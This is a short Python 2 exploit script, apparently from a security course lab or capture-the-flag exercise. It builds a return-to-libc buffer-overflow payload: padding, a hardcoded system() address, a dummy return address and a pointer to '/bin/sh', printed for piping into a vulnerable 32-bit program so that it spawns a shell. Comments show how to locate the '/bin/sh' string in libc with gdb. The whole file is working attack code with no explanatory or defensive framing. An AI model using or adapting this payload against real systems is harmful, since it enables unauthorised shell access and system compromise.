from shellcode import shellcode
from struct import pack
system_addr = pack("<I", 0x0804a030)
sh_addr = pack("<I", 0xbffeeb48)
print 'A' * 22 + system_addr + 'AAAA' + sh_addr + "/bin/sh"
## Find "/bin/sh" in libc using gdb.
## (gdb) find system_addr, +999999, "/bin/sh"
# sh_addr = pack("<I", 0x80c61e5)
# print 'A' * 22 + system_addr + 'AAAA' + sh_addr
